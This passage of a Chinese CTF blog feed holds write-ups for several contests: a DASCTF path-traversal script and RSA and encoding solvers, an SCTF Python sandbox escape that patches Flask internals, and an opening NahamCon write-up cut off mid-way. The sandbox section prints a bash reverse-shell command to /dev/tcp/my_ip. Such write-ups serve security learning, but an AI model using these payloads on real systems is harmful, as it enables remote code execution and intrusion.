href="https://lexsd6.github.io/2019/11/13/%E5%85%B3%E4%BA%8Eupdatexml()%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E7%9A%84%E6%80%9D%E8%80%83/">关于updatexml()报错注入</a></p><p>updatexml()等函数报错通常有报错输出长度的限制，可以进行用substr等函数分割输出。</p><p>有的报错函数要求输出一行数据或只一次查询一个字段,可以使用group_concat等函数聚合数据即可。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://xz.aliyun.com/t/7169#toc-53" target="_blank" rel="noopener">对MYSQL注入相关内容及部分Trick的归类小结</a></p><p><a href="https://xz.aliyun.com/t/2869" target="_blank" rel="noopener">SQL 注入绕过</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> sql </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安恒DASCTF 7月赛WP</title>
      <link href="/2020/07/26/%E5%AE%89%E6%81%92DASCTF%207%E6%9C%88%E8%B5%9BWP/"/>
      <url>/2020/07/26/%E5%AE%89%E6%81%92DASCTF%207%E6%9C%88%E8%B5%9BWP/</url>
      
        <content type="html"><![CDATA[<p>这次比赛搞错了时间，导致刚上去看了一道web就没有了(Crypto是偷偷找文件复现的)。tcl….</p><a id="more"></a><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="ezfileinclude"><a href="#ezfileinclude" class="headerlink" title="ezfileinclude"></a>ezfileinclude</h3><p>这道题有的谜，感觉是为了出题而出题（可能是我太年轻了）</p><p>有个很明显的文件包含，但要t与f两个参数。</p><p>t参数是当前时间流。</p><p>f参数要包含的文件的路径的base64。但过滤了<code>../</code></p><p>但经过测试，只过来f参数开头几个字符是<code>../</code>才被过滤。所以pay如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">x=<span class="string">'Z3F5LmpwZy8uLi8uLi8uLi8uLi8uLi8uLi9mbGFn'</span></span><br><span class="line">url=<span class="string">"http://183.129.189.60:10009/image.php?t="</span>+str(int(time.time()))+<span class="string">'&amp;f='</span>+x</span><br><span class="line"></span><br><span class="line">x=requests.get(url)</span><br><span class="line">print(x.text)Crypto</span><br></pre></td></tr></table></figure><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="bullshit"><a href="#bullshit" class="headerlink" title="bullshit"></a>bullshit</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pairing</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    shell = max(a, b)</span><br><span class="line">    step = min(a, b)</span><br><span class="line">    <span class="keyword">if</span> step == b: <span class="comment">#a&gt;=b </span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span> <span class="comment">#b&gt;a</span></span><br><span class="line">    <span class="keyword">return</span> shell ** <span class="number">2</span> + step * <span class="number">2</span> + flag<span class="comment"># a*a+b*b+0/1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(message)</span>:</span></span><br><span class="line">    res = <span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,len(message),<span class="number">2</span>):<span class="comment">#</span></span><br><span class="line">        res += str(pairing(message[i],message[i+<span class="number">1</span>]))<span class="comment">#取前后相邻的字符串</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line">print(encrypt(flag))</span><br><span class="line"><span class="comment"># 1186910804152291019933541010532411051999082499105051010395199519323297119520312715722</span></span><br></pre></td></tr></table></figure><p>分析一下题目，encrypt函数依次取flag的两个字符来通过pairing函数进行加密。</p><p>进入pairing发现，当a&gt;=b时返回<code>a*a+b*b</code>否则返回<code>a*a+b*b+1</code></p><p>根据经验判断，可见字符的ascill码最大是126最小是33，即pairing函数的最大返回值为31752，最小返回值为2178。所以返回值以1开头必定是5位数，开头大于3一定是4位数。2与3bu确定。</p><p>姑且，尝试开头大于1一定是4位数（在做题时，手动试下发现字母是小写，之后觉得有点不妥）恰好得到flag。payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on Sat Jul 25 22:08:06 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: 冰之幻魄</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pairing</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    shell = max(a, b)</span><br><span class="line">    step = min(a, b)</span><br><span class="line">    <span class="keyword">if</span> step == b: <span class="comment">#a&gt;=b </span></span><br><span class="line">        flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag = <span class="number">1</span> <span class="comment">#b&gt;a</span></span><br><span class="line">    <span class="keyword">return</span> shell ** <span class="number">2</span> + step * <span class="number">2</span> + flag</span><br><span class="line"></span><br><span class="line">ord(string.printable[<span class="number">1</span>])</span><br><span class="line">x=<span class="string">'1186910804152291019933541010532411051999082499105051010395199519323297119520312715722'</span></span><br><span class="line">MAX=<span class="number">126</span>**<span class="number">2</span>+<span class="number">126</span>**<span class="number">2</span> <span class="comment">#31752</span></span><br><span class="line">MIN=<span class="number">33</span>**<span class="number">2</span>+<span class="number">33</span>*<span class="number">2</span><span class="comment">#2178</span></span><br><span class="line">LIST=[]</span><br><span class="line">flag=<span class="string">''</span></span><br><span class="line"><span class="keyword">while</span> len(x)&gt;<span class="number">0</span>:</span><br><span class="line">    <span class="keyword">if</span> x[<span class="number">0</span>]==<span class="string">'1'</span>:</span><br><span class="line">       LIST.append(x[:<span class="number">5</span>]) </span><br><span class="line">       x=x[<span class="number">5</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">       LIST.append(x[:<span class="number">4</span>])</span><br><span class="line">       x=x[<span class="number">4</span>:]</span><br><span class="line">     </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> LIST:</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> string.printable:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> string.printable:</span><br><span class="line">            <span class="keyword">if</span> pairing(ord(a),ord(b))==int(i):</span><br><span class="line">                flag=flag+a+b                </span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><h3 id="EZrsa"><a href="#EZrsa" class="headerlink" title="EZrsa"></a>EZrsa</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,inverse,bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line">p=getPrime(<span class="number">1024</span>)</span><br><span class="line">r=getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    q = <span class="number">5</span>*p+i</span><br><span class="line">    <span class="keyword">if</span> isprime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n=p*q*r</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = pow(m,e,n)</span><br><span class="line">p3 = pow(p,<span class="number">3</span>,n)</span><br><span class="line">q3 = pow(q,<span class="number">3</span>,n)</span><br><span class="line"><span class="keyword">print</span> c</span><br><span class="line"><span class="keyword">print</span> e</span><br><span class="line"><span class="keyword">print</span> n</span><br><span class="line"><span class="keyword">print</span> p3</span><br><span class="line"><span class="keyword">print</span> q3</span><br><span class="line"></span><br><span class="line"><span class="comment">#c=121836624300974075697021410307617877799398704636412997043885070081959280989429720121505939271618801519845564677294487289085261071864489530938936756975266796724602572135614554790383740417604947122325421381322155502222532570899845171858215244411945889235509975121332503672838693190271397334662495169940649349725607212867270114445618201171582223868214171942753939282404133460110489725340075179818856587044172460703519751189284498768640898837525773823127259807337383870535232880471869465188882667401540052151795173003568424369575866780354852158304748299284900468768898966143729562589110027789165774068500360970335261801131264801996703446527156709491597639262305131309592217711956181866054589085773085822482247966030763162382493197473555330201343835684065991963179440335668817727280429581864224497755004825170263803174390985868997862117983334405815543271969716910040927833496696049703621334172902517666284662473059140662717708823</span></span><br><span class="line"><span class="comment">#e=65537</span></span><br><span class="line"><span class="comment">#n=20361372240024088786698455948788052559208001789410016096382703853157107986024860262721685000417719260611935731634077852127432140361792767202581631816544546972750034494061276779878409544779707914261679633764772575040304712361634318086289783951555842021028438799649252652041211341825451500751760872572402250747982495384263677669526575825183733353800694161425360299521143726681387485097281832219009682768523304737252763907939642212542959846630464628135025203489075698699980715986689341069964387779523254203021424865355054215122316160201073604105317768112281914334065349420946717116563634883368316247495042216330408372176714499012778410160478384503335610321108263706243329745785632599707740534386988945259578897614317582546751658480917188464178997026284336861027299289073045677754342746386408505695243800685323283852020325044649604548575089927541935884800327121875191739922436199496098842684301207745090701158839031935190703347091</span></span><br><span class="line"><span class="comment">#p3=3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513</span></span><br><span class="line"><span class="comment">#q3=7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397</span></span><br></pre></td></tr></table></figure><p>眨眼一看,一个‘普通’RSA，但细看发现。p、q都被立方并与n相模。但<code>n=p*q*r</code>、p与r经过getPrime(1024)随机生成。q的生成中经过至少经过一次<code>q = 5*p+i</code>。因此p**3大概率小于n。因此可以直接开三次方根的p。(后来sw0r3d师傅说这个方法不好，应该预期解用ralate attack)。再逆向得到r、q。</p><p>payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">Created on Sun Jul 25 23:22:10 2020</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@author: 冰之幻魄</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime,inverse,bytes_to_long,long_to_bytes</span><br><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> isprime</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">c=<span class="number">121836624300974075697021410307617877799398704636412997043885070081959280989429720121505939271618801519845564677294487289085261071864489530938936756975266796724602572135614554790383740417604947122325421381322155502222532570899845171858215244411945889235509975121332503672838693190271397334662495169940649349725607212867270114445618201171582223868214171942753939282404133460110489725340075179818856587044172460703519751189284498768640898837525773823127259807337383870535232880471869465188882667401540052151795173003568424369575866780354852158304748299284900468768898966143729562589110027789165774068500360970335261801131264801996703446527156709491597639262305131309592217711956181866054589085773085822482247966030763162382493197473555330201343835684065991963179440335668817727280429581864224497755004825170263803174390985868997862117983334405815543271969716910040927833496696049703621334172902517666284662473059140662717708823</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">n=<span class="number">20361372240024088786698455948788052559208001789410016096382703853157107986024860262721685000417719260611935731634077852127432140361792767202581631816544546972750034494061276779878409544779707914261679633764772575040304712361634318086289783951555842021028438799649252652041211341825451500751760872572402250747982495384263677669526575825183733353800694161425360299521143726681387485097281832219009682768523304737252763907939642212542959846630464628135025203489075698699980715986689341069964387779523254203021424865355054215122316160201073604105317768112281914334065349420946717116563634883368316247495042216330408372176714499012778410160478384503335610321108263706243329745785632599707740534386988945259578897614317582546751658480917188464178997026284336861027299289073045677754342746386408505695243800685323283852020325044649604548575089927541935884800327121875191739922436199496098842684301207745090701158839031935190703347091</span></span><br><span class="line">p3=<span class="number">3639847731266473012111996909765465259684540134584180368372338570948892196816095838781423020996407457408188225238520927483809091079993151555076781372882518810174687150067903870448436299501557380508793238254471833275507634732947964907461619182112787911133054275872120243558556697900528427679352181961312958660881800731678134481664074711076672290178389996403357076809805422591851145306425951725627843352207233693810474618882394140691334742086008967260117740486955640068190440609984095657695423536016475468229419187489359563800737261212975921663803729112420222039005478830477455592167092520074509241894829304209406713781082959299623674294927249556083486223036858674077173104518013601628447504500606447821540687465361616447631579976579754996021653630804073535352129315413118764836270751250405649683786487251823247828947202336680538849571498780353357272103697510910576879383751704763858882439578045020243015928994208017750848637513</span></span><br><span class="line">q3=<span class="number">7030777127779173206633582847346001157991477456002191926122836599155148909465054067800807615361108442560942058865403188672629297039703065927801771646334817871335134889139894648729527452541098449842202838983982508551750669662540615534327150829869964429006130891731472099912937717406120443380283548571270317421722042835639732966975812764084015221255115940508456442279902250677665136380988902682370875602145833135937210740790528756301051981994351553247852018355526641012434670664732924491790949235519600899289515495046353559475806935200029321563549553167235419039924276406059858659476329718809657072997385947262654743181242885709558209249589482036673428723035300722280229192727192487772217518673838209646300548275957450994828221329299666216457961746189885356929698674294944243729739850927111231235060005119781652245234537583181232715964191675241206562888107252569566488402724441835466680342239244581162530424964324562530832713397</span></span><br><span class="line"></span><br><span class="line">p= int(gmpy2.iroot( p3, <span class="number">3</span>)[<span class="number">0</span>])</span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i+=<span class="number">1</span></span><br><span class="line">    q = <span class="number">5</span>*p+i</span><br><span class="line">    <span class="keyword">if</span> isprime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">r=n//p//q</span><br><span class="line">d = gmpy2.invert(e,(q<span class="number">-1</span>)*(p<span class="number">-1</span>)*(r<span class="number">-1</span>))</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line"><span class="keyword">print</span> (long_to_bytes(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> web </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sctf2020 pythonbox题目复现小记</title>
      <link href="/2020/07/15/rgbCTF--wp/"/>
      <url>/2020/07/15/rgbCTF--wp/</url>
      
        <content type="html"><![CDATA[<p>比赛中觉得这道题有点意思,解题的思路也用很多(虽然都是函数劫持但很巧妙),有的构思十分恰妙,故写文以记下.</p><a id="more"></a><p>我这里因为环境有问题,本地post数据会蜜汁丢失(tcl,还没找到原因),所以把原题中的post部分改成了get但对思路来说无伤大雅.具体代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/', methods=["GET"])#源题是methods=["POST"]</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">security</span><span class="params">()</span>:</span></span><br><span class="line">    secret =request.args[<span class="string">"cmd"</span>]<span class="comment">#源题是request.form</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">42</span> &lt;= ord(i) &lt;= <span class="number">122</span>: <span class="keyword">return</span> <span class="string">"error!"</span></span><br><span class="line">   </span><br><span class="line">    exec(secret)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="string">"xXXxXXx"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">"0.0.0.0"</span>)</span><br></pre></td></tr></table></figure><p>由于出题人要求要rec，so题目的核心在于如何在：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> secret:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="number">42</span> &lt;= ord(i) &lt;= <span class="number">122</span>: <span class="keyword">return</span> <span class="string">"error!"</span></span><br></pre></td></tr></table></figure><p>即，没有引号、小括号、空格的情况下函数调用或继承链的构建。</p><p>在python中没有大小引号，我们就没法构件字符串。而命令执行函数调用的参数需要是字符串，继承链的构建中也需要字符串来做索引。</p><h3 id="构造字符串"><a href="#构造字符串" class="headerlink" title="构造字符串"></a>构造字符串</h3><p>先说下没有引号怎么构造吧。</p><p>1.利用<code>flask.__dor__</code>构造,<code>flask.__dor__</code>会返回字符串利用python字符串特性进行切片拼接.</p><p>2.利用request.host、request.content_md5、request.content_encoding这些返回值直接就是字符串的request属性获取字符串。</p><p>3.利用i，secret这些已存在的字符串进行处理后，作为request.args/request.form的索引进行传参。</p><h3 id="函数调用"><a href="#函数调用" class="headerlink" title="函数调用"></a>函数调用</h3><p>有了字符串后，我们就可以编造一些简单的继承链来修改一些配置与函数了，但是依然不能调用命令执行相关的函数，因为在python如要对函数进行有参数的调用必须要小括号。所以如何调用命令执行相关的函数是一个问题。</p><h4 id="劫持ord函数"><a href="#劫持ord函数" class="headerlink" title="劫持ord函数"></a>劫持ord函数</h4><p>由于ord函数是在<code>__builtins__</code>里，我们可以通过继承链关系找到<code>__builtins__.__dict__[‘ord’]</code>再用一个返回值在42与122间的函数覆盖它，这样我们第二次访问时 ，无论传入什么函数都可以绕过bypass。</p><p>这里有个小技巧，在lambda构造有默认参数的匿名函数时不需要空格来区分形参，只需要在形参面前加个<code>*</code>号。例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.__dict__[<span class="string">'ord'</span>] = <span class="keyword">lambda</span>*args:<span class="number">42</span></span><br></pre></td></tr></table></figure><p> 这样，调用ord时，ord无论参数是什么都只能返回42。</p><p>完整payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第一次</span></span><br><span class="line">cmd=__builtins__.__dict__[request.content_md5] = <span class="keyword">lambda</span>*args:<span class="number">42</span></span><br><span class="line">在包中添加头： content_md5:ord</span><br><span class="line"><span class="comment">#第二次</span></span><br><span class="line">cmd=__import__(<span class="string">'os'</span>).system(\<span class="string">"bash -c 'bash -i &gt;&amp; /dev/tcp/my_ip/23333 0&gt;&amp;1'\")</span></span><br></pre></td></tr></table></figure><h4 id="patch-flask自己的函数"><a href="#patch-flask自己的函数" class="headerlink" title="patch flask自己的函数"></a>patch flask自己的函数</h4><p>我们在审计flask代码时，会发现几个有趣的参数finalize_request、process_response、after_request_functions。他们在flask中的运行机制是</p><p>1。一旦web应用接收到reques，会调用finalize_request。</p><p>2。finalize_request首先会对请求使用make_response方法进行处理，该方法会将视图函数的返回值（response对象或者一个元组）封装成一个response对象。</p><p>3。调用 process_response 方法，使用 after_request_functions 当中的函数进行处理，返回处理过后的response。</p><p>4。如果抛出异常，raise</p><p>因此我们可以：</p><p>让<code>process_response=exec</code>,<code>make_response</code>值为我们想执行的代码</p><p>具体操作如下：</p><p>方法1：直接更改process_response</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?cmd=Flask.__doc__=request.args[secret[0]];app.make_response=lambda*p:Flask.__doc__;app.process_response=exec;&amp;F=print(‘lexsd6’)</span><br></pre></td></tr></table></figure><p><img src="image-20200715001759238.png" alt="image-20200715001759238"></p><p>方法2：通过after_request_functions更改process_response：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:5000/?cmd=Flask.__doc__=request.args[secret[0]];app.make_response=lambda*p:Flask.__doc__;app.after_request_funcs[None]=[exec];&amp;F=print(‘lexsd6’)</span><br></pre></td></tr></table></figure><p><img src="image-20200715142352986.png" alt="image-20200715142352986"></p><h4 id="patch-url-parse"><a href="#patch-url-parse" class="headerlink" title="patch url_parse"></a>patch url_parse</h4><p>url_parse  是一个处理url的函数我们可以让它为eval,这样url中<code>/</code>后的数据将会当成eval的参数来执行.</p><p>具体可以看官方wp:</p><p><a href="https://ctftime.org/writeup/22157" target="_blank" rel="noopener">https://ctftime.org/writeup/22157</a></p><h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p><a href="https://pham-nuwens-document.readthedocs.io/zh/latest/flask%E5%AD%A6%E4%B9%A0/flask%E6%B5%81%E7%A8%8B%E8%AF%A6%E8%A7%A3.html" target="_blank" rel="noopener">flask流程详解</a></p><p><a href="https://imagin.vip/?p=1489#pysandbox" target="_blank" rel="noopener">https://imagin.vip/?p=1489#pysandbox</a></p><p><a href="http://www.l-team.org/archives/379.html" target="_blank" rel="noopener">http://www.l-team.org/archives/379.html</a></p><p><a href="https://ctftime.org/writeup/22157" target="_blank" rel="noopener">https://ctftime.org/writeup/22157</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NahamCon CTF WP</title>
      <link href="/2020/06/18/NahamCon%20CTF%20WP/"/>
      <url>/2020/06/18/NahamCon%20CTF%20WP/</url>
      
        <content type="html"><![CDATA[<p>某周末,在某大佬的推荐下打了下NahamCon CTF在最后几小时里体验了下这真’雨露均沾’的ctf的感觉.(但菜还是菜这点没变(눈_눈)  )</p><a id="more"></a><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Agent-95"><a href="#Agent-95" class="headerlink" title="Agent 95"></a>Agent 95</h3><p>进入题目，看到</p><p><img src="C:%5CUsers%5Clexs%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200615234157462.png" alt="image-20200615234157462"></p><p>分析要抓包改header，User-Agent改成: Mozilla/4.0(compatible;MSIE6.0;Windows 95)</p><p><img src="image-20200615235227934.png" alt="image-20200615235227934"></p><h3 id="Localghost"><a href="#Localghost" class="headerlink" title="Localghost"></a>Localghost</h3><p>进入题目 F12查看原代码，发现可疑js。</p><p><img src="image-20200615235426204.png" alt="image-20200615235426204"></p><p>进入<a href="http://jh2i.com:50003/jquery.jscroll2.js看到" target="_blank" rel="noopener">http://jh2i.com:50003/jquery.jscroll2.js看到</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var _0xbcec&#x3D;[&quot;\x75\x73\x65\x20\x73\x74\x72\x69\x63\x74&quot;,&quot;\x6A\x73\x63\x72\x6F\x6C\x6C&quot;,&quot;\x3C\x73\x6D\x61\x6C\x6C\x3E\x4C\x6F\x61\x64\x69\x6E\x67\x2E\x2E\x2E\x3C\x2F\x73\x6D\x61\x6C\x6C\x3E&quot;,&quot;\x61\x3A\x6C\x61\x73\x74&quot;,&quot;&quot;,&quot;\x66\x6C\x61\x67&quot;,&quot;\x53\x6B\x4E\x55\x52\x6E\x74\x7A\x63\x47\x39\x76\x62\x32\x39\x76\x61\x33\x6C\x66\x5A\x32\x68\x76\x63\x33\x52\x7A\x58\x32\x6C\x75\x58\x33\x4E\x30\x62\x33\x4A\x68\x5A\x32\x56\x39&quot;,&quot;\x73\x65\x74\x49\x74\x65\x6D&quot;,&quot;\x6C\x6F\x63\x61\x6C\x53\x74\x6F\x72\x61\x67\x65&quot;,&quot;\x64\x61\x74\x61&quot;,&quot;\x66\x75\x6E\x63\x74\x69\x6F\x6E&quot;,&quot;\x64\x65\x66\x61\x75\x6C\x74\x73&quot;,&quot;\x65\x78\x74\x65\x6E\x64&quot;,&quot;\x6F\x76\x65\x72\x66\x6C\x6F\x77\x2D\x79&quot;,&quot;\x63\x73\x73&quot;,&quot;\x76\x69\x73\x69\x62\x6C\x65&quot;,&quot;\x66\x69\x72\x73\x74&quot;,&quot;\x6E\x65\x78\x74\x53\x65\x6C\x65\x63\x74\x6F\x72&quot;,&quot;\x66\x69\x6E\x64&quot;,&quot;\x62\x6F\x64\x79&quot;,&quot;\x68\x72\x65\x66&quot;,&quot;\x61\x74\x74\x72&quot;,&quot;\x20&quot;,&quot;\x63\x6F\x6E\x74\x65\x6E\x74\x53\x65\x6C\x65\x63\x74\x6F\x72&quot;,&quot;\x74\x72\x69\x6D&quot;,&quot;\x73\x72\x63&quot;,&quo